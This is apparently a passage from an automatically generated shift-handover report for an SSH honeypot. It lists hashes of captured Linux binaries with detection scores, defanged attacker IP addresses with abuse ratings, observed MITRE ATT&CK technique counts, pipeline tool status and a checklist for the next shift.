| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `159.203.20[.]239` | CA | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `45.224.188[.]56` | AR | BM SOLUCIONES S.R.L. | **100** ⚠️ | 0 |
| `116.255.226[.]73` | CN | Zhengzhou Gainet Computer Network Technology Co.,Ltd. | **100** ⚠️ | 16 |
| `49.163.139[.]48` | KR | LG POWERCOMM | **100** ⚠️ | 12 |
| `119.91.19[.]185` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 5 |
| `157.245.147[.]189` | SG | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `179.50.206[.]78` | CR | Cable Tica | **100** ⚠️ | 1 |
| `120.52.12[.]202` | CN | CHINA UNICOM CLOUD DATA COMPANY LIMITED | **100** ⚠️ | 50 |
| `103.59.94[.]124` | ID | PT Lakuloka Digital Indonesia | **100** ⚠️ | 50 |
| `36.95.194[.]51` | ID | PT Telekomunikasi Indonesia | **100** ⚠️ | 34 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 24 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 12 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |

---

## 🔕 False Positive Summary (46 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 23 below threshold 25 | 12 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 29 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 124 cases |
| Tool 34  | Credential Extractor        | ✅ 19 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 46 filtered (37.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 12 recon entry/entries in table (4 group(s) consolidating 58 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-14T17:56:45Z_
